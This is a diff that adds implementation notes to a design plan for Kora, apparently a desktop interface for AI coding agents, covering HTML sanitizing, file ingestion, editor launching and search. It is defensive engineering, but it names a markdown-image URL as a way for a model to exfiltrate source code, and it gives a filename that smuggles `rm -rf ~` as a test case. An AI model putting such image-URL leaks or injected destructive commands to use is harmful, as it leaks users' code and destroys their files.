@@ -61,3 +61,98 @@ src/
 3. A response containing a markdown table, a fenced code block, and a collapsible section all render correctly (not as raw text).
 4. Diff-formatted responses render with a real diff viewer, and "open in editor" successfully opens the relevant file in the user's configured editor.
 5. `Ctrl+F`/`⌘F` search finds matches across the entire session transcript (including lines scrolled out of view), not just what's currently mounted in the DOM.
+
+---
+
+## Implementation notes
+
+### Rendering: one HTML surface, one sanitizer
+
+`state/markdown.ts` is the only module that produces HTML and `Markdown.tsx` the
+only component that mounts it. Everything else in the transcript is React
+children. The sanitizer runs on markdown output, on highlight.js output, and
+again on anything re-inserted while highlighting fences — including markup Kora
+generated itself, because "we wrote it" is not a security property.
+
+**`<img>` is not in the allowlist**, which the plan did not anticipate. Markdown
+image syntax renders as its alt text instead. An image tag is a network request
+the *model* chose and a URL is a channel: `![](https://elsewhere/?d=…)` fires on
+paint with nothing to click, which makes it an exfiltration primitive in a tool
+whose whole context is the user's source code. Attachments the user added are
+rendered from their own bytes, which needs no tag.
+
+Links get `target="_blank"` + `rel="noopener noreferrer nofollow"`; `style`,
+`script`, `iframe`, `form`, event handlers, and `javascript:`/`data:` URLs are
+all refused.
+
+Streaming responses render as plain text and only become markdown when the turn
+settles — a half-written fence or table would otherwise flicker through every
+intermediate parse.
+
+Bundle: highlight.js is imported as core plus 25 registered languages rather
+than the full pack. An unknown fence label renders escaped plain text rather
+than auto-detecting, because detection on a short snippet is usually wrong and
+wrong colours read as a claim about the code. Production bundle is 423 KB raw /
+136 KB gzipped.
+
+### Ingestion: one policy, in Rust
+
+`files/ingest.rs` owns the whole file policy — 64 KB of text (truncated past
+that, with the real size still reported), 3.5 MB for images, binary detected by
+NUL bytes or invalid UTF-8 and attached by path rather than as mangled text,
+folders refused with something the user can act on.
+
+Bytes that never touched disk (a pasted screenshot, the webview's file picker)
+go through `ingest_bytes`, which shares that policy, so **how a file entered
+Kora cannot change what Kora does with it**. Paths are canonicalized before
+anything is read, so a `..` segment never survives into the record.
+
+Drag-and-drop uses the webview's own drop event and reads the bytes, rather than
+Tauri's path-carrying drag-drop event: it works identically in tests and in a
+browser preview, and it keeps a single ingest path. A dropped folder is
+rejected explicitly (v1 scope).
+
+### Attachments reach the agent as protocol, not prose
+
+`AgentAdapter::encode_prompt_with` puts images in the API's own base64 image
+block and text files in a text block that names the path, so the agent can read
+the rest itself instead of Kora shipping a repository through the prompt.
+Images are refused up front for an agent whose adapter does not declare
+`Capability::Vision`, rather than spending a turn discovering it.
+
+### Editor and save
+
+`files/open.rs` spawns argv arrays only. `$VISUAL` beats `$EDITOR`; flags in
+either (`code -w`) are preserved as separate arguments; macOS falls back to
+`open`. A file named `; rm -rf ~ && echo pwned.txt` is one argument, and there
+is a test that proves the file survives.
+
+The save target is asked for with a prompt in the webview and written by the
+backend, since this build adds no dialog plugin.
+
+### Search
+
+In-session search runs over `session.lines` — the store's whole transcript,
+including code blocks — so a match twenty screens up is found and can be
+stepped to; `activeMatchKey` scrolls it into view. Three modes: plain, regex
+(an unfinished pattern matches nothing rather than throwing), and fuzzy
+(characters in order, one hit per line).
+
+Cross-session search is the one part that must ask the backend, since most of
+what it searches is not open in a tab: `sessions_search` does a case-insensitive
+`LIKE` over stored line payloads with `%` and `_` escaped, so a query containing
+them finds those characters instead of acting as a wildcard.
+
+### Multi-line input
+
+The command input is now a growing `textarea`: Enter sends, Shift+Enter is a
+newline, and a pasted block keeps its newlines and indentation. History arrows
+only take the key while the input is a single line, so multi-line editing keeps
+normal caret movement.
+
+### Not done
+
+- **Directory ingestion** — out of scope for v1 per the master plan; dropping a
+  folder is refused with a message rather than silently walking the tree.
+- **Fuzzy match spans** — fuzzy mode reports one match per line rather than
+  highlighting each matched character, which would light up most of a line.
